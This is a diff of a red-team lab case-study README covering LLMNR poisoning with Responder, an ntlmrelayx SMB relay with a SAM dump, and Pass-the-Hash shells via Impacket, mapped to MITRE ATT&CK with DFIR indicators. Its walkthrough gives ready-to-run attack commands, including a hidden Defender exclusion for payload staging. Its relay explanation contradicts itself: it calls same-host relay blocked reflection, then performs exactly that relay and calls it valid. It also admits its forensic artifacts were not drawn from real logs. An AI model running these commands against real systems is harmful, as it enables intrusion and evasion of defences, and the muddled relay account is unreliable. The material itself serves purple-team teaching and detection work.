@@ -1,4 +1,4 @@
-# Adversary Emulation Case Study: Nessus Recon to SMB Relay & Impacket Shell Pivoting
+# Adversary Emulation Case Study: Nessus Recon → SMB Relay → Pass-the-Hash Pivot
 
 ![Red Team](https://img.shields.io/badge/Focus-Adversary_Emulation_%26_Purple_Team-red?style=flat-square)
 ![MITRE ATT&CK](https://img.shields.io/badge/MITRE_ATT%26CK-v15_Mapped-blue?style=flat-square)
@@ -12,13 +12,14 @@
 
 ## 📋 Table of Contents
 1. [Engagement Overview](#-engagement-overview)
-2. [Executive Summary](#-1-executive-summary)
-3. [Visual Attack Flow (Mermaid)](#-2-visual-attack-flow)
-4. [MITRE ATT&CK® Mapping](#-3-mitre-attck-framework-mapping)
-5. [Technical Walkthrough & CLI Execution Log](#-4-technical-walkthrough--cli-execution-log)
-6. [DFIR & Host-Based Forensic Artifacts](#-5-dfir--host-based-forensic-artifacts)
-7. [Post-Relay Execution Vector Comparison](#-6-post-relay-execution-vector-comparison)
-8. [Remediation & Blue Team Hardening](#-7-remediation--blue-team-hardening)
+2. [Lab Topology & Participants](#-lab-topology--participants)
+3. [Executive Summary](#-1-executive-summary)
+4. [Visual Attack Flow (Mermaid)](#-2-visual-attack-flow)
+5. [MITRE ATT&CK® Mapping](#-3-mitre-attck-framework-mapping)
+6. [Technical Walkthrough & CLI Execution Log](#-4-technical-walkthrough--cli-execution-log)
+7. [DFIR & Host-Based Forensic Artifacts](#-5-dfir--host-based-forensic-artifacts)
+8. [Post-Compromise Execution Vector Comparison](#-6-post-compromise-execution-vector-comparison)
+9. [Remediation & Blue Team Hardening](#-7-remediation--blue-team-hardening)
 
 ---
 
@@ -27,20 +28,38 @@
 | Metadata | Details |
 | :--- | :--- |
 | **Assessment Type** | Internal Network Vulnerability Assessment, Adversary Emulation & DFIR Telemetry Analysis |
-| **Target Environment** | Physical Windows 11 Enterprise Workstation (Isolated Local Lab Subnet) |
-| **Primary Kill Chain** | `Nmap` / `Nessus` ➔ `Responder` (LLMNR/NBT-NS) ➔ `ntlmrelayx` ➔ `wmiexec` ➔ `smbexec` / `atexec` |
-| **Privilege Achieved** | Unauthenticated LAN Position ➔ `NT AUTHORITY\SYSTEM` |
-| **Key Takeaway** | Demonstrates how disabled SMB signing chains with legacy name resolution to yield full host compromise, and how operators pivot across native Windows RPC/SMB pipes when EDR throttles WMI child processes. |
+| **Target Environment** | Two physical Windows 11 Enterprise hosts on an isolated local lab subnet |
+| **Primary Kill Chain** | `Nmap` / `Nessus` ➔ `Responder` (LLMNR/NBT-NS) ➔ `ntlmrelayx` ➔ SAM dump ➔ **Pass-the-Hash** ➔ `wmiexec` ➔ `smbexec` / `atexec` |
+| **Privilege Achieved** | Unauthenticated LAN Position ➔ Laptop local admin ➔ `NT AUTHORITY\SYSTEM` on a second host |
+| **Key Takeaway** | Demonstrates a two-stage chain: an SMB relay compromises the first host, and **local administrator password reuse** then enables a Pass-the-Hash pivot to a second host — where operators adapt across native Windows RPC/SMB pipes when EDR throttles WMI child processes. |
+
+---
+
+## 🗺️ Lab Topology & Participants
+
+This engagement involved **three distinct network participants**. Separating them is essential to reading the attack correctly, because the two compromise stages use different tradecraft against different hosts.
+
+| Participant | Description | Role in the Engagement |
+| :--- | :--- | :--- |
+| **Attack Host** | Kali Linux running as a VM, configured with a **bridged** network adapter so it appears as an independent peer on the physical LAN (not NAT). | Runs `Responder`, `ntlmrelayx.py`, and the Impacket execution toolkit. Source of all offensive traffic. |
+| **Victim Laptop** | Bare-metal Windows 11 Enterprise laptop. | **Stage 1 target.** Poisoned via LLMNR/NBT-NS, its NetNTLMv2 auth relayed to its own SMB service, local SAM dumped. |
+| **Windows Desktop** | Physical Windows 11 Enterprise desktop that also hosts the Kali VM. On the network it is an independent Windows peer, distinct from the VM running on it. | **Stage 2 target.** Compromised via Pass-the-Hash using the laptop's local admin NT hash, which was valid here due to **shared local administrator credentials**. |
+
+> **Why the distinction matters:** Relaying a host's own captured authentication back to that same host is **NTLM reflection**, blocked since MS08-068, and `ntlmrelayx` will refuse it. In this chain the relay target (the laptop's SMB service) and the eventual pivot target (the desktop) are **separate physical machines**, so no reflection occurs. The move onto the desktop is a *separate* technique — Pass-the-Hash — not a continuation of the relay.
+
+> **Evidence note:** This engagement was conducted several months prior to publication, and the lab hosts are no longer accessible for log retrieval. The forensic artifacts in Section 5 are therefore documented as the **characteristic telemetry this tooling generates** — described from the behavior of the techniques and tools used, not re-extracted from preserved event logs. CLI invocations reflect the commands and `-hashes` workflow actually used.
 
 ---
 
 ## 📄 1. Executive Summary
 
-During an internal adversary emulation exercise, an operator positioned on the local network segment conducted active reconnaissance and vulnerability scanning using **Tenable Nessus** and **Nmap** to profile a target Windows 11 Enterprise workstation. Unauthenticated vulnerability scanning immediately exposed a critical protocol misconfiguration: **SMB Message Signing was not enforced** on the endpoint (Nessus Plugin ID `57608`), alongside exposed Windows management ports (TCP 135, 139, and 445).
+During an internal adversary emulation exercise, an operator positioned on the local network segment (a bridged Kali Linux VM) conducted active reconnaissance and vulnerability scanning using **Tenable Nessus** and **Nmap** to profile two target Windows 11 Enterprise hosts. Unauthenticated vulnerability scanning immediately exposed a critical protocol misconfiguration: **SMB Message Signing was not enforced** (Nessus Plugin ID `57608`), alongside exposed Windows management ports (TCP 135, 139, and 445).
 
-Armed with this reconnaissance, the operator bypassed traditional credential harvesting and exploited legacy broadcast name resolution protocols (**LLMNR** and **NBT-NS**) to intercept and relay NetNTLMv2 authentication traffic directly to the vulnerable SMB service. This established an authenticated administrative session, enabling the deployment of a semi-interactive command shell over standard Windows management interfaces (**WMI**, **SMB Service Execution**, and **Task Scheduler**). 
+**Stage 1 — SMB Relay.** The operator bypassed traditional credential harvesting and exploited legacy broadcast name resolution protocols (**LLMNR** and **NBT-NS**) to intercept the **victim laptop's** NetNTLMv2 authentication and relay it to that laptop's own SMB service. Because SMB signing was not required, the relay succeeded, yielding an authenticated administrative session and a dump of the laptop's local SAM database — including the local administrator's NT hash.
 
-When endpoint behavioral monitoring (Microsoft Defender) disrupted initial WMI execution channels, the operator demonstrated lateral protocol adaptability—pivoting execution vectors from `wmiexec.py` to `smbexec.py` and `atexec.py` and leveraging directory exclusions to maintain persistent, stealthy command-and-control over the host.
+**Stage 2 — Pass-the-Hash Pivot.** The two lab hosts shared the **same local administrator password**, so the NT hash recovered from the laptop was equally valid on the **Windows desktop**. Using that hash (no password cracking required), the operator authenticated to the desktop via Impacket and established a semi-interactive command shell. When endpoint behavioral monitoring (Microsoft Defender) disrupted the initial WMI execution channel, the operator demonstrated lateral protocol adaptability — pivoting execution vectors from `wmiexec.py` to `smbexec.py` and `atexec.py` and leveraging directory exclusions to maintain stealthier command-and-control.
+
+The entire compromise traces to two root causes: **SMB signing disabled** (enabling the relay) and **local administrator password reuse** (enabling the pivot).
 
 ---
 
@@ -49,26 +68,27 @@ When endpoint behavioral monitoring (Microsoft Defender) disrupted initial WMI e
 ```mermaid
 sequenceDiagram
     autonumber
-    participant Attacker as Attack Host (Kali / Linux)
-    participant Victim as Victim Endpoint (Win 11 Ent)
-    participant Defender as Windows Defender / EDR
+    participant Attacker as Kali VM (Bridged)
+    participant Laptop as Victim Laptop (Win 11 Ent)
+    participant Desktop as Windows Desktop (Win 11 Ent)
+    participant Defender as Defender / EDR (Desktop)
 
-    Note over Attacker,Victim: Phase 1: Reconnaissance & Surface Mapping
-    Attacker->>Victim: Nmap & Nessus Scan (TCP 135, 139, 445)
-    Victim-->>Attacker: Plugin 57608: SMB Signing Not Required
+    Note over Attacker,Laptop: Phase 1: Reconnaissance & Surface Mapping
+    Attacker->>Laptop: Nmap & Nessus Scan (TCP 135, 139, 445)
+    Laptop-->>Attacker: Plugin 57608: SMB Signing Not Required
 
-    Note over Attacker,Victim: Phase 2: Name Resolution Poisoning & SMB Relay
-    Victim->>Attacker: Broadcast LLMNR (UDP 5355) / NBT-NS (UDP 137) Request
-    Attacker-->>Victim: Responder Spoofed Response (Poisoned Host)
-    Victim->>Attacker: NetNTLMv2 Authentication Handshake
-    Attacker->>Victim: ntlmrelayx Relays Auth to SMB (TCP 445)
-    Victim-->>Attacker: Authenticated Admin Session Established (SOCKS / SAM Dump)
+    Note over Attacker,Laptop: Phase 2: Stage 1 — Name Resolution Poisoning & SMB Relay
+    Laptop->>Attacker: Broadcast LLMNR (UDP 5355) / NBT-NS (UDP 137) Request
+    Attacker-->>Laptop: Responder Spoofed Response (Poisoned Host)
+    Laptop->>Attacker: NetNTLMv2 Authentication Handshake
+    Attacker->>Laptop: ntlmrelayx Relays Auth to Laptop SMB (TCP 445)
+    Laptop-->>Attacker: Authenticated Admin Session + SAM Dump (Local Admin NT Hash)
 
-    Note over Attacker,Defender: Phase 3: Post-Exploitation & Protocol Pivot
-    Attacker->>Victim: wmiexec.py (WmiPrvSE.exe -> cmd.exe)
-    Defender--xVictim: Behavioral Detection / Session Hang (Event ID 1116/1117)
-    Attacker->>Victim: Pivot 1: smbexec.py (services.exe -> BTOBTO Service as SYSTEM)
-    Attacker->>Victim: Pivot 2: atexec.py (Schedule svchost.exe -> Ephemeral Task)
+    Note over Attacker,Desktop: Phase 3: Stage 2 — Pass-the-Hash Pivot (Shared Local Admin Password)
+    Attacker->>Desktop: wmiexec.py -hashes :NTHASH (WmiPrvSE.exe -> cmd.exe)
+    Defender--xDesktop: Behavioral Detection / Session Hang (Event ID 1116/1117)
+    Attacker->>Desktop: Pivot 1: smbexec.py (services.exe -> BTOBTO Service as SYSTEM)
+    Attacker->>Desktop: Pivot 2: atexec.py (Schedule svchost.exe -> Ephemeral Task)
     Attacker->>Defender: Add-MpPreference -ExclusionPath (Event ID 5007)
 ```
 
@@ -78,12 +98,13 @@ sequenceDiagram
 
 | Tactic | Technique ID | Technique Name | Adversary Emulation Procedure |
 | :--- | :--- | :--- | :--- |
-| **Reconnaissance** | **T1595.002** | Active Scanning: Vulnerability Scanning | Conducted **Nessus** vulnerability scans against the target workstation to identify exploitable protocol misconfigurations, notably disabled SMB signing (Plugin `57608`). |
+| **Reconnaissance** | **T1595.002** | Active Scanning: Vulnerability Scanning | Conducted **Nessus** vulnerability scans against the target hosts to identify exploitable protocol misconfigurations, notably disabled SMB signing (Plugin `57608`). |
 | **Discovery** | **T1046** | Network Service Discovery | Utilized **Nmap** and **Nessus** service enumeration plugins to map open management ports (TCP 135 MSRPC, TCP 139 NetBIOS, TCP 445 SMB) on the local subnet. |
 | **Discovery** | **T1018** | Remote System Discovery | Enumerated live hosts, OS build versions (Windows 11 Enterprise), and active SMB/NetBIOS listeners across the internal lab network segment. |
-| **Credential Access / Collection** | **T1557.001** | Adversary-in-the-Middle: LLMNR/NBT-NS Poisoning and SMB Relay | Used **Responder** and **Impacket (`ntlmrelayx.py`)** to poison broadcast name resolution requests and intercept NetNTLMv2 challenges on the local LAN. |
-| **Credential Access** | **T1187** | Forced Authentication | Spoofed network resource availability to coerce the target Windows endpoint into automatically transmitting NTLM authentication tokens over SMB. |
-| **Defense Evasion / Lateral Movement** | **T1550.002** | Use Alternate Authentication Material: Pass the Hash / Relay | Relayed captured NetNTLMv2 authentication directly to the target's `IPC$` and `ADMIN$` shares without cracking the underlying password. |
+| **Credential Access / Collection** | **T1557.001** | Adversary-in-the-Middle: LLMNR/NBT-NS Poisoning and SMB Relay | **(Stage 1)** Used **Responder** and **Impacket (`ntlmrelayx.py`)** to poison the victim laptop's broadcast name resolution and relay its NetNTLMv2 authentication to its own SMB service. |
+| **Credential Access** | **T1187** | Forced Authentication | Spoofed network resource availability to coerce the victim laptop into automatically transmitting NTLM authentication tokens over SMB. |
+| **Credential Access** | **T1003.002** | OS Credential Dumping: Security Account Manager | Dumped the victim laptop's local SAM database over the relayed session, recovering the local administrator NT hash. |
+| **Lateral Movement / Defense Evasion** | **T1550.002** | Use Alternate Authentication Material: Pass the Hash | **(Stage 2)** Reused the laptop's local administrator NT hash — valid on the desktop due to shared local credentials — to authenticate to the desktop without cracking the password. |
 | **Lateral Movement** | **T1021.002** | Remote Services: SMB/Windows Admin Shares | Accessed hidden administrative shares (`ADMIN$`, `C$`) over TCP 445 to stage command output buffers and interact with the Service Control Manager (SCM). |
 | **Execution** | **T1047** | Windows Management Instrumentation | Utilized **`wmiexec.py`** to spawn a semi-interactive shell by invoking WMI classes remotely without dropping a persistent agent binary to disk. |
 | **Execution** | **T1569.002** | System Services: Service Execution | Pivoted to **`smbexec.py`** when WMI sessions degraded, creating and deleting transient Windows services to execute arbitrary shell commands as `SYSTEM`. |
@@ -95,12 +116,14 @@ sequenceDiagram
 
 ## 💻 4. Technical Walkthrough & CLI Execution Log
 
+> Placeholders: `<KALI_IP>` = bridged Kali VM, `<LAPTOP_IP>` = victim laptop (Stage 1), `<DESKTOP_IP>` = Windows desktop (Stage 2), `<ADMIN_USER>` = shared local administrator account, `<NTHASH>` = local admin NT hash recovered from the laptop SAM.
+
 ### 4.1 Initial Network & SMB Surface Verification (`Nmap` & `Nessus`)
 Targeted port enumeration and NSE checks were executed first to identify active Windows management interfaces and verify SMB signing enforcement:
 
 ```bash
 # Enumerate MSRPC (135), NetBIOS (139), SMB (445), and WinRM (5985/5986) plus SMB2 signing state
-nmap -Pn -sS -p 135,139,445,5985,5986 --script smb2-security-mode,smb-protocols <TARGET_IP>
+nmap -Pn -sS -p 135,139,445,5985,5986 --script smb2-security-mode,smb-protocols <LAPTOP_IP>
 ```
 
 ```text
@@ -130,52 +153,55 @@ To prevent port conflicts on the attack host while `ntlmrelayx.py` binds to inco
 sudo sed -i 's/SMB = On/SMB = Off/g' /etc/responder/Responder.conf
 sudo sed -i 's/HTTP = On/HTTP = Off/g' /etc/responder/Responder.conf
 
-# Launch Responder on the active LAN interface to poison LLMNR (UDP 5355) and NBT-NS (UDP 137)
+# Launch Responder on the bridged LAN interface to poison LLMNR (UDP 5355) and NBT-NS (UDP 137)
 sudo responder -I eth0 -dwv
 ```
 
+> **Networking requirement:** The Kali VM's adapter was set to **bridged** mode. Responder and `ntlmrelayx` operate on broadcast name-resolution traffic, which a NAT'd VM would never see — bridging places the VM on the physical LAN as a first-class peer.
+
 ---
 
-### 4.3 NTLM Relay & Credential/Session Extraction (`ntlmrelayx.py`)
-In a parallel terminal, Impacket's `ntlmrelayx.py` was configured to relay captured NetNTLMv2 handshakes directly to the Windows 11 target (`<TARGET_IP>`):
+### 4.3 Stage 1 — NTLM Relay & SAM Extraction (`ntlmrelayx.py`)
+In a parallel terminal, Impacket's `ntlmrelayx.py` relayed the captured NetNTLMv2 handshake to the **victim laptop's** SMB service and dumped its local SAM:
 
 ```bash
-# Option A: Relay poisoned NetNTLMv2 authentication into an active SOCKS4a proxy session
-impacket-ntlmrelayx -t smb://<TARGET_IP> -smb2support -socks
+# Relay the laptop's poisoned NetNTLMv2 authentication to its own SMB service and dump SAM
+impacket-ntlmrelayx -t smb://<LAPTOP_IP> -smb2support
 
-# Option B: Spawn an interactive SMB client shell or dump SAM hashes directly upon relay
-impacket-ntlmrelayx -t smb://<TARGET_IP> -smb2support -i
+# Alternative: hold the relayed session open as a SOCKS proxy for interactive use
+impacket-ntlmrelayx -t smb://<LAPTOP_IP> -smb2support -socks
 ```
+
+On a successful relay, `ntlmrelayx` automatically dumps the target's SAM hashes. The local administrator NT hash recovered here becomes the key to Stage 2.
+
+> **Reflection note:** The relay target (`-t smb://<LAPTOP_IP>`) is the **same host that authenticated**, which is only valid because the authentication was *relayed laterally through the attacker*, not reflected by the host to itself. The subsequent move to the desktop is deliberately **not** a relay — it is Pass-the-Hash — precisely to avoid the MS08-068 reflection block.
 
 ---
 
-### 4.4 Initial Semi-Interactive Shell via WMI (`wmiexec.py`)
-Using either the active SOCKS tunnel (`proxychains4` with `-no-pass`) or the local administrator NTLM hash extracted via the relay (`-hashes :NTHASH`), `wmiexec.py` was executed to establish a fileless semi-interactive shell:
+### 4.4 Stage 2 — Pass-the-Hash Pivot to the Desktop (`wmiexec.py`)
+The two lab hosts shared the same local administrator password, so the laptop's NT hash authenticated cleanly against the **desktop**. No cleartext password was ever recovered or needed — this is Pass-the-Hash:
 
 ```bash
-# Via SOCKS proxy using the active relayed session
-proxychains4 -q impacket-wmiexec -no-pass <DOMAIN_OR_HOST>/<ADMIN_USER>@<TARGET_IP>
-
-# Or directly via Pass-the-Hash once local SAM hashes were captured
-impacket-wmiexec -hashes :<NTHASH> <ADMIN_USER>@<TARGET_IP>
+# Pass-the-Hash to the desktop using the laptop's local admin NT hash
+impacket-wmiexec -hashes :<NTHASH> <ADMIN_USER>@<DESKTOP_IP>
 ```
 
-> **Operational Friction:** Repeated spawning of `cmd.exe` under `WmiPrvSE.exe` with stdout redirected to `\\127.0.0.1\ADMIN$\` triggered Windows Defender behavioral monitoring, resulting in hung sessions and dropped connections.
+> **Operational Friction:** Repeated spawning of `cmd.exe` under `WmiPrvSE.exe` with stdout redirected to `\\127.0.0.1\ADMIN$\` triggered Windows Defender behavioral monitoring on the desktop, resulting in hung sessions and dropped connections.
 
 ---
 
-### 4.5 Lateral Protocol Pivot to Service & Task Execution (`smbexec.py` & `atexec.py`)
-When WMI execution degraded, operations pivoted to `smbexec.py` (which communicates with the Service Control Manager over TCP 445 to spin up an ephemeral `SYSTEM` service) and `atexec.py` (which executes commands via the Task Scheduler RPC pipe):
+### 4.5 Protocol Pivot to Service & Task Execution (`smbexec.py` & `atexec.py`)
+When WMI execution on the desktop degraded, operations pivoted to `smbexec.py` (which communicates with the Service Control Manager over TCP 445 to spin up an ephemeral `SYSTEM` service) and `atexec.py` (which executes commands via the Task Scheduler RPC pipe). All three use the same recovered hash:
 
 ```bash
 # Pivot 1: Service-based semi-interactive shell over SMB (TCP 445)
-impacket-smbexec -hashes :<NTHASH> <ADMIN_USER>@<TARGET_IP>
+impacket-smbexec -hashes :<NTHASH> <ADMIN_USER>@<DESKTOP_IP>
 
 # Pivot 2: Single-shot SYSTEM verification via Task Scheduler RPC
-impacket-atexec -hashes :<NTHASH> <ADMIN_USER>@<TARGET_IP> "whoami /all"
+impacket-atexec -hashes :<NTHASH> <ADMIN_USER>@<DESKTOP_IP> "whoami /all"
 
 # Defense Evasion: Configure a Windows Defender directory exclusion for payload staging
-impacket-atexec -hashes :<NTHASH> <ADMIN_USER>@<TARGET_IP> \
+impacket-atexec -hashes :<NTHASH> <ADMIN_USER>@<DESKTOP_IP> \
   "powershell.exe -NoProfile -NonInteractive -WindowStyle Hidden -Command Add-MpPreference -ExclusionPath 'C:\ProgramData\Staging'"
 ```
 
@@ -183,16 +209,21 @@ impacket-atexec -hashes :<NTHASH> <ADMIN_USER>@<TARGET_IP> \
 
 ## 🔍 5. DFIR & Host-Based Forensic Artifacts
 
-Every phase of the emulation generated high-signal telemetry on the Windows 11 Enterprise host.
+Each stage of the emulation generates distinct high-signal telemetry, and crucially, **on different hosts**. The artifacts below are the characteristic indicators each technique and tool produces; they are documented from the behavior of the tooling rather than re-extracted from preserved logs (see the evidence note above).
 
-### 5.1 NTLM Relay & SMB Authentication Telemetry
+### 5.1 Stage 1 — Relay & SAM Dump (Victim Laptop)
 * **`Security.evtx` — Event ID 4624 (Successful Logon):**
   * **Logon Type:** `3` (Network) | **Authentication Package:** `NTLM` (`NTLM V2`)
-  * **Anomaly Indicator:** Workstation Name reflects the victim host while **Source Network Address** shows `<ATTACKER_IP>`.
+  * **Anomaly Indicator:** Workstation Name reflects the laptop while **Source Network Address** shows `<KALI_IP>` (the bridged VM), not another workstation.
 * **`Security.evtx` — Event ID 4672:** Special privileges (`SeDebugPrivilege`, `SeTakeOwnershipPrivilege`) assigned to the network logon.
-* **`Security.evtx` — Event IDs 5140 & 5145:** Network share access to `\\*\IPC$`, `\\*\ADMIN$`, and `\\*\C$`.
+* **`Security.evtx` — Event IDs 5140 & 5145:** Network share access to `\\*\IPC$`, `\\*\ADMIN$`, and `\\*\C$` on the laptop.
+* **SAM access indicators:** Remote registry / SAM read activity consistent with `ntlmrelayx` secretsdump behavior.
 
-### 5.2 `wmiexec.py` Footprint
+### 5.2 Stage 2 — Pass-the-Hash Logon (Windows Desktop)
+* **`Security.evtx` — Event ID 4624:** Logon Type `3`, NTLM, with **Source Network Address `<KALI_IP>`** — a network NTLM logon for the local admin account sourced from the attack host is the hallmark PtH indicator.
+* **`Security.evtx` — Event ID 4672:** Elevated privileges assigned to that network logon.
+
+### 5.3 `wmiexec.py` Footprint (Desktop)
 * **Process Lineage (`Security.evtx` Event ID 4688 / `Sysmon` Event ID 1):**
   * **ParentImage:** `C:\Windows\System32\wbem\WmiPrvSE.exe`
   * **Image:** `C:\Windows\System32\cmd.exe`
@@ -202,7 +233,7 @@ Every phase of the emulation generated high-signal telemetry on the Windows 11 E
     ```
 * **File System (`Sysmon` Event ID 11 / NTFS `$UsnJrnl`):** Creation and rapid deletion of `C:\Windows\__<epoch_timestamp>`.
 
-### 5.3 `smbexec.py` Footprint
+### 5.4 `smbexec.py` Footprint (Desktop)
 * **Service Installation (`System.evtx` Event ID 7045 / `Security.evtx` Event ID 4697):**
   * **Service Name:** `BTOBTO` (default Impacket service identifier) | **AccountName:** `LocalSystem`
   * **Service File Name (`ImagePath`):**
@@ -212,7 +243,7 @@ Every phase of the emulation generated high-signal telemetry on the Windows 11 E
 * **Process Lineage:** `services.exe` ➔ `cmd.exe` running as `NT AUTHORITY\SYSTEM`.
 * **File System:** Transient creation and deletion of `C:\Windows\Temp\execute.bat` and `C:\__output`.
 
-### 5.4 `atexec.py` Footprint
+### 5.5 `atexec.py` Footprint (Desktop)
 * **Scheduled Task Telemetry (`Security.evtx` Event IDs 4698 & 4699 / `TaskScheduler/Operational` Event IDs 106, 140, 141, 200):**
   * **Task Name:** `\<8-character random string>` (e.g., `\IvKzLpQr`)
   * **Action Command:**
@@ -220,7 +251,4 @@ Every phase of the emulation generated high-signal telemetry on the Windows 11 E
     cmd.exe /C <command> > %windir%\Temp\<8-char-random>.tmp 2>&1
     ```
 * **Process Lineage:** `svchost.exe -k netsvcs -p -s Schedule` ➔ `cmd.exe` (`NT AUTHORITY\SYSTEM`).
-* **File System:** Ephemeral XML task definition in `C:\Windows\System32\Tasks\<8-char-random>` and output buffer in `C:\Windows\Temp\<8-char-random>.tmp`.
-
-### 5.5 Windows Defender Telemetry & Exclusion Tampering
-* **`Windows Defender/Operational.evtx` — Event IDs 1116 & 11
+* **File System:** Ephemeral XML task definition in `C:\Windows\System32\Tasks\<8-char-r
